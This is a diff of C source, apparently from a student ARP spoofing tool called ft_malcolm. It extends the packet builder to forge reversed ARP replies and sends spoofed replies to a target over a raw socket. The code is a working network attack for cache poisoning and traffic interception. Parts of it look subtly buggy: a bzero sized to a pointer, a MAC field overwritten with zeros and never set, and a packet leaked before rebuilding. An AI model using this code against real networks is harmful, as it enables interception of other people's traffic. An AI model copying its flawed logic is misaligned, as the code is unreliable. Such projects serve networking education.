@@ -101,25 +101,45 @@ void		sig_handler(int num_sig)
 	}
 }
 
-t_arp_packet	*build_pkt(t_env *env)
+t_arp_packet	*build_pkt(t_env *env, bool rev)
 {
 	t_arp_packet *pkt;
 
 	if ((pkt = (t_arp_packet *)malloc(sizeof(t_arp_packet))) == NULL)
 		return (NULL);
 	ft_bzero(pkt, sizeof(pkt));
-	ft_memcpy(pkt->targ_hw_addr, env->target_mac->bytes, sizeof(env->target_mac->bytes));
-	ft_memcpy(pkt->src_hw_addr, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+	if (rev == false)
+	{
+		ft_memcpy(pkt->targ_hw_addr, env->target_mac->bytes, sizeof(env->target_mac->bytes));
+		ft_memcpy(pkt->src_hw_addr, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+	}
+	else
+	{
+		ft_memcpy(pkt->src_hw_addr, env->target_mac->bytes, sizeof(env->target_mac->bytes));
+		ft_memcpy(pkt->targ_hw_addr, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+	}
 	pkt->frame_type     = htons(0x0806);
 	pkt->hw_type        = htons(1);
 	pkt->prot_type      = htons(0x0800);
 	pkt->hw_addr_size   = 6;
 	pkt->prot_addr_size = 4;
 	pkt->op             = htons(2);
-	pkt->source_ip = env->source_ip->sin_addr.s_addr;
-	ft_memcpy(pkt->source_mac, env->source_mac->bytes, sizeof(env->source_mac->bytes));
-	pkt->target_ip = env->target_ip->sin_addr.s_addr;
-	ft_memcpy(pkt->target_mac, env->target_mac->bytes, sizeof(env->target_mac->bytes));
+	if (rev == false)
+	{
+		pkt->source_ip = env->source_ip->sin_addr.s_addr;
+		ft_memcpy(pkt->source_mac, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+		pkt->target_ip = env->target_ip->sin_addr.s_addr;
+		ft_memcpy(pkt->target_mac, env->target_mac->bytes, sizeof(env->target_mac->bytes));
+	}
+	else
+	{
+		pkt->source_ip = env->target_ip->sin_addr.s_addr;
+		ft_memcpy(pkt->source_mac, env->source_mac->bytes, sizeof(env->source_mac->bytes));
+		pkt->target_ip = env->source_ip->sin_addr.s_addr;
+		t_mac empty_mac;
+		ft_bzero(&empty_mac, sizeof(empty_mac));
+		ft_memcpy(pkt->source_mac, &empty_mac, sizeof(env->target_mac->bytes));
+	}
 	ft_bzero(pkt->padding, 18);
 	return (pkt);
 }
@@ -189,11 +209,29 @@ int			ft_malcolm(t_env *env)
 		if (init_sock(env, AF_INET, SOCK_PACKET, ETH_P_RARP))
 			return (-1);
 		printf("Sending spoofed ARP to ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\twith src ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n",
-		arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
-		env->target_mac->bytes[0], env->target_mac->bytes[1], env->target_mac->bytes[2], env->target_mac->bytes[3], env->target_mac->bytes[4], env->target_mac->bytes[5],
-		arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
-		env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
-		if ((pkt = build_pkt(env)) == NULL)
+			arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
+			env->target_mac->bytes[0], env->target_mac->bytes[1], env->target_mac->bytes[2], env->target_mac->bytes[3], env->target_mac->bytes[4], env->target_mac->bytes[5],
+			arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
+			env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
+		if ((pkt = build_pkt(env, false)) == NULL)
+		{
+			close(env->sock_fd);
+			return (-1);
+		}
+		target_addr = *(struct sockaddr*)env->target_ip;
+		ft_strcpy(target_addr.sa_data, env->iface);
+		if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
+		{
+			close(env->sock_fd);
+			free(pkt);
+			return (-1);
+		}
+		printf("Sending spoofed ARP to ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n\t\t\t\twith src ip %u.%u.%u.%u - mac %02x:%02x:%02x:%02x:%02x:%02x\n",
+			arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
+			env->target_mac->bytes[0], env->target_mac->bytes[1], env->target_mac->bytes[2], env->target_mac->bytes[3], env->target_mac->bytes[4], env->target_mac->bytes[5],
+			arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
+			env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
+		if ((pkt = build_pkt(env, false)) == NULL)
 		{
 			close(env->sock_fd);
 			return (-1);
